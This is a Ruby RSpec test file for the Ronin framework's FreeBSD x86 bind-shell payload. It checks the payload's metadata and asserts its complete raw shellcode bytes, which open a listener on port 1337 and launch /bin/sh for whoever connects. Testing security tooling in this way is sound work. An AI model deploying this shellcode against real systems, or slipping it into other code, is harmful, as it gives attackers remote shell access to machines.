require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/freebsd/x86/bind_shell'

describe Ronin::Payloads::Shellcode::FreeBSD::X86::BindShell do
  it "must inherit from Ronin::Payloads::Shellcode::BindShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::BindShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/freebsd/x86/bind_shell'" do
      expect(subject.id).to eq('shellcode/freebsd/x86/bind_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :freebsd" do
      expect(subject.os).to be(:freebsd)
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46\x0a\x05\x39\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
